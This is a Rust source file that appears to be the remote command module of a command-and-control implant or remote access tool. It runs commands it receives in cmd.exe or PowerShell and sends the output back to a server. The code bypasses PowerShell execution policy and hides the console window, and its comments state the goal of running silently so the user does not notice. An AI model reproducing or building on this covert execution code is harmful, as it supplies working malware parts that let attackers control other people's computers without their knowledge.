use std::{
    io::Read,
    os::windows::process::CommandExt,
    process::{Command, Stdio},
};

use shared::commands::Response;

// arguments: - cmd: the command input. pointer because we can get value from referencing the string
//            - run_powershell: whether to run the command in PowerShell or CMD
// we return a string, but using a Result differentiates between stdout and stderr
fn run(cmd: &str, run_powershell: bool) -> Result<String, String> {
    let mut command = if run_powershell { // if run_powershell is true
        Command::new("powershell.exe") // we create a new Command to run powershell.exe
    } else {
        Command::new("cmd.exe") // if not, we run cmd.exe instead.
    }; // Command is a struct offered by Rust's standard library to aid in spawning processes.

    let mut child = if run_powershell { // if we have to run in powershell,
        command
            .args(&[ // use these powershell arguments to hide the powershell window,
                //      so that our command runs silently in the background without interrupting the user.
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-WindowStyle",
                "Hidden",
                "-Command",
                cmd,
            ])
            .stdout(Stdio::piped()) // we will capture this later to return it to the user
            .stderr(Stdio::piped()) // same with stderr if any is returned
            .stdin(Stdio::null()) // we aren't piping anything into the process so this is null
            .creation_flags(0x08000000) // CREATE_NO_WINDOW. seems to only work for cmd though
            .spawn() // finally, spawn the powershell process
            .map_err(|e| format!("Failed to spawn PowerShell process: {}", e))?
    } else {
        command
            .args(&["/C", cmd])
            .stdout(Stdio::piped()) // like above, it will be captured later
            .stderr(Stdio::piped()) // ^
            .stdin(Stdio::null())
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .spawn() // spawn
            .map_err(|e| format!("Failed to spawn CMD process: {}", e))?
    };

    // init strings where we will store process output
    let mut stdout = String::new();
    let mut stderr = String::new();

    // if we can get a handle to the stdout of the process
    if let Some(ref mut stdout_handle) = child.stdout {
        stdout_handle
            .read_to_string(&mut stdout) // we write the data to our string variable
            .map_err(|e| format!("Failed to read stdout: {}", e))?; // error handling for this
    }

    // if we get a handle for the stderr...?
    if let Some(ref mut stderr_handle) = child.stderr {
        stderr_handle
            .read_to_string(&mut stderr) // read it into the string
            .map_err(|e| format!("Failed to read stderr: {}", e))?;
    }

    // wait for the shell to exit
    let exit_status = child
        .wait() // will obviously hang if you were to spawn something like bash. i think.
        .map_err(|e| format!("Failed to wait for process: {}", e))?;

    // check exit status and return stdout/stderr dependant on it
    if exit_status.success() { // did the process exit with a success code?
        Ok(stdout.trim().to_string()) // awesome, let's return stdout
    } else {
        if stderr.trim().is_empty() {
            Err(format!(
                "Process exited with code: {:?}", // return something generic if we crashed with no stderr
                exit_status.code()
            ))
        } else {
            Ok(stderr.trim().to_string()) // return the stderr in case of process exiting unsuccessfully
        }
    }
}

pub fn main(cmd: String, run_powershell: bool) -> Response {
    match run(&cmd, run_powershell) { // simply use the function from above
        Ok(stdout) => Response::PowerShell(stdout), // success? return the stdout to the server
        Err(_e) => Response::Error(_e), // return the error the server if not
    }
}
